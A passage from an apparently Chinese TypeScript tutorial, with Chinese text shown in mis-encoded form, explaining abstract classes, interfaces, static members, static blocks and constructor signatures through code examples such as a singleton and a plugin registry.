function_">area</span>(): <span class="hljs-built_in">number</span>;  <span class="hljs-comment">// ä»éœ€å­ç±»å®ç°</span><br>  <br>  <span class="hljs-comment">// æä¾›é»˜è®¤å®ç°</span><br>  <span class="hljs-title function_">perimeter</span>(): <span class="hljs-built_in">number</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getSides</span>().<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, side</span>) =&gt;</span> sum + side, <span class="hljs-number">0</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•ï¼ˆéæ¥å£è¦æ±‚ï¼‰</span><br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">getSides</span>(): <span class="hljs-built_in">number</span>[];<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Polygon</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">private</span> <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">super</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">area</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>;<br>  &#125;<br>  <br>  <span class="hljs-title function_">getSides</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> [<span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å®ç°è§„èŒƒä¸æœ€ä½³å®è·µ</strong></p><ol><li>æ¥å£éš”ç¦»åŸåˆ™ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ‹†åˆ†å¤§æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printer</span> &#123;<br>  <span class="hljs-title function_">print</span>(<span class="hljs-attr">document</span>: <span class="hljs-title class_">Document</span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Scanner</span> &#123;<br>  <span class="hljs-title function_">scan</span>(): <span class="hljs-title class_">Document</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AllInOnePrinter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Printer</span>, <span class="hljs-title class_">Scanner</span> &#123;<br>  <span class="hljs-comment">// åˆ†åˆ«å®ç°å°æ¥å£</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>æŠ½è±¡ç±»ä½œä¸ºæ¨¡æ¿ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span> &#123;<br>  <span class="hljs-comment">// æ¨¡æ¿æ–¹æ³•ï¼ˆå›ºå®šæµç¨‹ï¼‰</span><br>  <span class="hljs-title function_">process</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validate</span>(data);<br>    <span class="hljs-keyword">const</span> cleaned = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clean</span>(data);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transform</span>(cleaned);<br>  &#125;<br>  <br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">clean</span>(<span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">string</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">transform</span>(<span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">unknown</span>;<br>  <br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"><span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (!data) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Invalid data&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>æ¥å£æ‰©å±•æŠ½è±¡ç±»ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Component</span> &#123;<br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">render</span>(): <span class="hljs-title class_">HTMLElement</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Stateful</span> &#123;<br>  <span class="hljs-title function_">setState</span>(<span class="hljs-attr">state</span>: <span class="hljs-built_in">object</span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Component</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Stateful</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;button&quot;</span>); &#125;<br>  <span class="hljs-title function_">setState</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>é¿å…ç©ºå®ç°ï¼ˆè¿åæ¥å£å¥‘çº¦ï¼‰ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åæ¨¡å¼ï¼šç©ºå®ç°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EmptyLogger</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Loggable</span> &#123;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123;&#125; <span class="hljs-comment">// ğŸš« è¿åæ¥å£è¯­ä¹‰</span><br>&#125;<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šæŠ›å‡ºæ˜ç¡®é”™è¯¯</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NotImplementedLogger</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Loggable</span> &#123;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Method not implemented&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹æ£€æŸ¥è¦ç‚¹</strong></p><ol><li>å®ç°å…¼å®¹æ€§ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClockInterface</span> &#123;<br>  <span class="hljs-attr">currentTime</span>: <span class="hljs-title class_">Date</span>;<br>  <span class="hljs-title function_">setTime</span>(<span class="hljs-attr">d</span>: <span class="hljs-title class_">Date</span>): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Clock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClockInterface</span> &#123;<br>  <span class="hljs-attr">currentTime</span>: <span class="hljs-title class_">Date</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>  <br>  <span class="hljs-comment">// âœ… å‚æ•°ç±»å‹å…¼å®¹ï¼ˆDate â†’ Dateï¼‰</span><br>  <span class="hljs-title function_">setTime</span>(<span class="hljs-params"><span class="hljs-attr">d</span>: <span class="hljs-title class_">Date</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTime</span> = d;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>å¯é€‰æ¥å£æˆå‘˜ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">required</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">optional</span>?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// å¯é€‰å±æ€§</span><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Config</span> &#123;<br>  required = <span class="hljs-string">&quot;default&quot;</span>;<br>  <span class="hljs-comment">// æ— éœ€å®ç° optional</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>åªè¯»æ¥å£å±æ€§ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ImmutablePoint</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Point</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImmutablePoint</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-4-ç±»é™æ€æˆå‘˜ä¸æ„é€ ç­¾å"><a href="#1-2-4-ç±»é™æ€æˆå‘˜ä¸æ„é€ ç­¾å" class="headerlink" title="1.2.4 ç±»é™æ€æˆå‘˜ä¸æ„é€ ç­¾å"></a>1.2.4 ç±»é™æ€æˆå‘˜ä¸æ„é€ ç­¾å</h3><p><strong>é™æ€æˆå‘˜ï¼ˆStatic Membersï¼‰</strong></p><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ol><li>ä½¿ç”¨ static å…³é”®å­—å£°æ˜</li><li>é€šè¿‡ç±»åç›´æ¥è®¿é—®ï¼ˆè€Œéå®ä¾‹ï¼‰</li><li>ä¸å¯è®¿é—®å®ä¾‹æˆå‘˜</li><li>å¯ç»§æ‰¿ï¼ˆå­ç±»å¯é€šè¿‡ super æˆ–ç±»åè®¿é—®ï¼‰</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtils</span> &#123;<br>  <span class="hljs-comment">// é™æ€å±æ€§</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;<br>  <br>  <span class="hljs-comment">// é™æ€æ–¹æ³•</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">calculateCircleArea</span>(<span class="hljs-attr">radius</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">PI</span> * radius * radius; <span class="hljs-comment">// æ³¨æ„ï¼šthisæŒ‡å‘ç±»æœ¬èº«</span><br>  &#125;<br>  <br>  <span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šè®¿é—®å®ä¾‹æˆå‘˜</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">invalidMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼æ— æ³•è®¿é—®å®ä¾‹å±æ€§</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// è®¿é—®é™æ€æˆå‘˜</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-property">PI</span>); <span class="hljs-comment">// 3.14159</span><br><span class="hljs-keyword">const</span> area = <span class="hljs-title class_">MathUtils</span>.<span class="hljs-title function_">calculateCircleArea</span>(<span class="hljs-number">5</span>); <span class="hljs-comment">// 78.53975</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedMath</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">MathUtils</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">logPI</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;PI value:&quot;</span>, <span class="hljs-variable language_">super</span>.<span class="hljs-property">PI</span>); <span class="hljs-comment">// é€šè¿‡superè®¿é—®</span><br>    <span class="hljs-comment">// æˆ– console.log(MathUtils.PI);</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é™æ€å—ï¼ˆStatic Blocksï¼‰</strong></p><p>TS 4.4+ ç‰¹æ€§ï¼šç”¨äºåˆå§‹åŒ–å¤æ‚é™æ€å±æ€§</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigLoader</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;;<br>  <br>  <span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-comment">// æ‰§è¡Œå¤æ‚åˆå§‹åŒ–</span><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;config.json&quot;</span>, <span class="hljs-string">&quot;utf8&quot;</span>));<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = &#123; <span class="hljs-attr">default</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ„é€ ç­¾åï¼ˆConstructor Signaturesï¼‰</strong></p><p>æ ¸å¿ƒæ¦‚å¿µï¼šæè¿°ç±»çš„æ„é€ å‡½æ•°ç±»å‹</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ„é€ ç­¾åè¡¨ç¤ºæ³•</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClockConstructor</span> &#123;<br>  <span class="hljs-title function_">new</span> (<span class="hljs-attr">hour</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">minute</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">ClockInterface</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClockInterface</span> &#123;<br>  <span class="hljs-title function_">tick</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// å®ç°æ„é€ ç­¾å</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DigitalClock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClockInterface</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">h</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">m</span>: <span class="hljs-built_in">number</span></span>) &#123;&#125; <span class="hljs-comment">// å®ç°æ„é€ å‡½æ•°</span><br>  <span class="hljs-title function_">tick</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;beep beep&quot;</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">// å·¥å‚å‡½æ•°ä½¿ç”¨æ„é€ ç­¾å</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createClock</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">ctor</span>: <span class="hljs-title class_">ClockConstructor</span>,</span><br><span class="hljs-params">  <span class="hljs-attr">hour</span>: <span class="hljs-built_in">number</span>,</span><br><span class="hljs-params">  <span class="hljs-attr">minute</span>: <span class="hljs-built_in">number</span></span><br><span class="hljs-params"></span>): <span class="hljs-title class_">ClockInterface</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>(hour, minute);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> digital = <span class="hljs-title function_">createClock</span>(<span class="hljs-title class_">DigitalClock</span>, <span class="hljs-number">12</span>, <span class="hljs-number">30</span>);<br>digital.<span class="hljs-title function_">tick</span>(); <span class="hljs-comment">// &quot;beep beep&quot;</span><br></code></pre></td></tr></table></figure><p><strong>é™æ€æˆå‘˜ä¸æ„é€ ç­¾åå®æˆ˜</strong></p><p>åœºæ™¯1ï¼šå•ä¾‹æ¨¡å¼</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">AppConfig</span>;<br>  <br>  <span class="hljs-comment">// ç§æœ‰æ„é€ å™¨é˜²æ­¢å¤–éƒ¨å®ä¾‹åŒ–</span><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">env</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>  <br>  <span class="hljs-comment">// é™æ€è®¿é—®ç‚¹</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getInstance</span>(): <span class="hljs-title class_">AppConfig</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">AppConfig</span>.<span class="hljs-property">instance</span>) &#123;<br>      <span class="hljs-title class_">AppConfig</span>.<span class="hljs-property">instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppConfig</span>(<span class="hljs-string">&quot;production&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">AppConfig</span>.<span class="hljs-property">instance</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> config = <span class="hljs-title class_">AppConfig</span>.<span class="hljs-title function_">getInstance</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(config.<span class="hljs-property">env</span>); <span class="hljs-comment">// &quot;production&quot;</span><br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šç±»æ³¨å†Œç³»ç»Ÿ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ„é€ ç­¾åå®šä¹‰</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PluginConstructor</span> &#123;<br>  <span class="hljs-title function_">new</span> (): <span class="hljs-title class_">Plugin</span>;<br>  <span class="hljs-attr">pluginName</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// é™æ€å±æ€§è¦æ±‚</span><br>&#125;<br><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Plugin</span> &#123;<br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">run</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// æ³¨å†Œè¡¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PluginRegistry</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-attr">plugins</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">PluginConstructor</span>&gt; = &#123;&#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"><span class="hljs-attr">ctor</span>: <span class="hljs-title class_">PluginConstructor</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>[ctor.<span class="hljs-property">pluginName</span>] = ctor;<br>  &#125;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">create</span>(<span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Plugin</span> | <span class="hljs-literal">null</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">Ctor</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>[name];<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Ctor</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>() : <span class="hljs-literal">null</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ’ä»¶å®ç°</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerPlugin</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Plugin</span> &#123;<br>  <span class="hljs-keyword">static</span> pluginName = <span class="hljs-string">&quot;Logger&quot;</span>; <span class="hljs-comment">// æ»¡è¶³é™æ€å±æ€§è¦æ±‚</span><br>  <span class="hljs-title function_">run</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Logging...&quot;</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">// æ³¨å†Œå¹¶ä½¿ç”¨</span><br><span class="hljs-title class_">PluginRegistry</span>.<span class="hljs-title function_">register</span>(<span class="hljs-title class_">LoggerPlugin</span>);<br><span class="hljs-keyword">const</span> plugin = <span class="hljs-title class_">PluginRegistry</span>.<span class="hljs-title function_">create</span>(<span class="hljs-string">&quot;Logger&quot;</span>);<br>plugin?.<span class="hljs-title function_">run</span>(); <span class="hljs-comment">// &quot;Logging...&quot;</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æ„é€ ç­¾åæ¨¡å¼</strong></p><ol><li>æ³›å‹æ„é€ ç­¾å</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Factory</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]): T;<br>&#125;<br><br><span class="hljs-keyword">function</span> createInstance&lt;T&gt;(<span class="hljs-title class_">Clazz</span>: <span class="hljs-title class_">Factory</span>&lt;T&gt;, ...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]): T &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Clazz</span>(...args);<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-title function_">createInstance</span>(<span class="hljs-title class_">Product</span>, <span class="hljs-string">&quot;P1001&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">id</span>); <span class="hljs-comment">// &quot;P1001&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æ„é€ å‡½æ•°ç±»å‹åˆ«å</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span 